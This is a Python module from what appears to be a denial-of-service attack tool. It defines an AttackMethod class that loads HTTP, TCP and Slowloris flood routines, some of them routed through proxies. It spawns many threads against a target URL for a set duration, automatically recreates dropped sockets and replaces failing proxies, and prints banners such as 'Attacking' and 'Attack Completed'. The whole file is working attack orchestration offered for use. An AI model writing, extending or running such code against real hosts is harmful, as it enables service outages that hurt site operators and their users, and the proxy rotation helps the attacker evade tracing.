"""This module provides a class to instantiate DoS attacks."""

from __future__ import annotations

import socket
import sys
from threading import Thread
from time import sleep, time
from typing import Callable, Dict, List, Tuple, Union

from colorama import Fore
from humanfriendly import Spinner, format_timespan

from tools.addons.ip_tools import get_target_address
from tools.addons.sockets import create_socket, create_socket_proxy


def get_method_by_name(method: str) -> Callable:
    """Get the flood function based on the attack method.

    Args:
        - method - The method's name

    Returns:
        - flood_function - The associated flood function
    """
    if method in ["http", "http-proxy", "slowloris", "slowloris-proxy"]:
        layer_number = 7
    elif method in ["tcp"]:
        layer_number = 4
    directory = f"tools.L{layer_number}.{method}"
    module = __import__(directory, fromlist=["object"])
    flood_function = getattr(module, "flood")
    return flood_function


class AttackMethod:
    """Control the attack's inner operations."""

    def __init__(
        self,
        method_name: str,
        duration: int,
        threads: int,
        target: str,
        sleep_time: int = 15,
    ):
        """Initialize the attack object.

        Args:
            - method_name - The name of the DoS method used to attack
            - duration - The duration of the attack, in seconds
            - threads - The number of threads that will attack the target
            - target - The target's URL
            - sleep_time - The sleeping time of the sockets (Slowloris only)
        """
        self.method_name = method_name
        self.duration = duration
        self.threads_count = threads
        self.target = target
        self.sleep_time = sleep_time
        self.threads: List[Thread]
        self.threads = []
        self.is_running = False

    def __enter__(self) -> AttackMethod:
        """Set flood function and target's URL formatted attributes."""
        self.method = get_method_by_name(self.method_name)
        self.target = get_target_address(self.target)
        return self

    def __exit__(self, exc_type, exc_value, traceback) -> None:
        """Do nothing, only for context manager."""

    def __run_timer(self) -> None:
        """Verify the execution time every second."""
        __stop_time = time() + self.duration
        while time() < __stop_time:
            sleep(1)
        self.is_running = False

    def __run_flood(
        self, *args: Union[socket.socket, Tuple[socket.socket, Dict[str, str]]]
    ) -> None:
        """Start the flooder."""
        while self.is_running:

            # Slowloris flood.
            if "slowloris" in self.method_name:
                if "proxy" in self.method_name:
                    try:
                        self.method(args[0], args[1])
                    except (ConnectionResetError, BrokenPipeError):
                        sock, proxy = create_socket_proxy(self.target)
                        self.thread = Thread(
                            target=self.__run_flood, args=(sock, proxy)
                        )
                        self.thread.start()
                else:
                    self.method(args[0])
                sleep(self.sleep_time)

            # Other methods flood.
            else:
                self.method(self.target)

    def __run_threads(self) -> None:
        """Initialize the threads."""
        # Initialization of Slowloris.
        if "slowloris" in self.method_name:
            with Spinner(
                label=f"{Fore.YELLOW}Creating {self.threads_count} Socket(s)...{Fore.RESET}",
                total=100,
            ) as spinner:
                for index in range(self.threads_count):
                    if "proxy" in self.method_name:
                        sock, proxy = create_socket_proxy(
                            self.target,
                        )
                        self.threads.append(
                            Thread(target=self.__run_flood, args=(sock, proxy))
                        )
                    else:
                        sock = create_socket(
                            self.target,
                        )
                        self.threads.append(
                            Thread(target=self.__run_flood, args=(sock,))
                        )
                    spinner.step(100 / self.threads_count * (index + 1))

        # Initialization of other methods.
        else:
            self.threads = [
                Thread(target=self.__run_flood) for _ in range(self.threads_count)
            ]

        with Spinner(
            label=f"{Fore.YELLOW}Starting {self.threads_count} Thread(s){Fore.RESET}",
            total=100,
        ) as spinner:
            for index, thread in enumerate(self.threads):
                self.thread = thread
                self.thread.start()
                spinner.step(100 / len(self.threads) * (index + 1))

        # Timer starts counting after all threads were created.
        timer = Thread(target=self.__run_timer)
        timer.start()

        # Close all threads after the attack is completed.
        for index, thread in enumerate(self.threads):
            thread.join()

        print(f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}Attack Completed!\n\n{Fore.RESET}")

    def start(self) -> None:
        """Start the DoS attack itself."""
        target = str(self.target).strip("()").replace(", ", ":").replace("'", "")
        duration = format_timespan(self.duration)
        print(
            f"{Fore.MAGENTA}\n[!] {Fore.BLUE}Attacking {Fore.MAGENTA}{target}{Fore.BLUE} using {Fore.MAGENTA}{self.method_name.upper()}{Fore.BLUE} method {Fore.MAGENTA}\n\n[!] {Fore.BLUE}The attack will stop after {Fore.MAGENTA}{duration}{Fore.BLUE}\n{Fore.RESET}"
        )
        if "slowloris" in self.method_name:
            print(
                f"{Fore.MAGENTA}[!] {Fore.BLUE}Sockets that eventually went down are automatically recreated!\n\n{Fore.RESET}"
            )
        elif self.method_name == "http-proxy":
            print(
                f"{Fore.MAGENTA}[!] {Fore.BLUE}Proxies that don't return 200 status are automatically replaced!\n\n{Fore.RESET}"
            )

        self.is_running = True

        try:
            self.__run_threads()

        except KeyboardInterrupt:
            self.is_running = False
            print(
                f"{Fore.RED}\n\n[!] {Fore.MAGENTA}Ctrl+C detected. Stopping Attack...{Fore.RESET}"
            )

            for thread in self.threads:
                if thread.is_alive():
                    thread.join()

            print(
                f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}Attack Interrupted!\n\n{Fore.RESET}"
            )
            sys.exit(1)
